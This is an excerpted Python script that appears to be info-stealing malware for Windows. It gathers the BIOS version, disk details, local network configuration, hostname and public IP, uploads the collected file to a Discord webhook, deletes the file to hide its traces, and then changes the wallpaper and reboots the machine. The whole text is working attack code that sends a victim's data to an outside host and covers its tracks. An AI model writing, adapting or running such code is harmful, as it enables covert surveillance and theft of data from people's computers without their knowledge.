...
def getBiosVersion():
    ...
    return getRegistryValue(r"HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion")
...
def getSystemInfoWindows():
    ...
    diskInfo = executeCommand("wmic logicaldisk where \"DeviceID='C:'\" get Size,FreeSpace")
...
def saveNetworkAndSystemInfo():
    ...
    info = {
        ...
        'Local Network Configuration': getLocalNetworkInfo(),
        **getSystemInfoWindows(),
    ...
    if os.path.exists(filePath):
        with open(filePath, "rb") as file:
            response = requests.post(
                webhookUrl,
                files={"file": file},
                data={"content": f"Information of the PC: " + socket.gethostname() + ". IP: " + getPublicIp()}
            )
...
infoFilePath = saveNetworkAndSystemInfo()

# Send the log file to the Discord webhook
sendFileToDiscord(infoFilePath, webhookUrl)

# delete info file
deleteTrace()

# change wallpaper and reboot the system
funnyTrace()
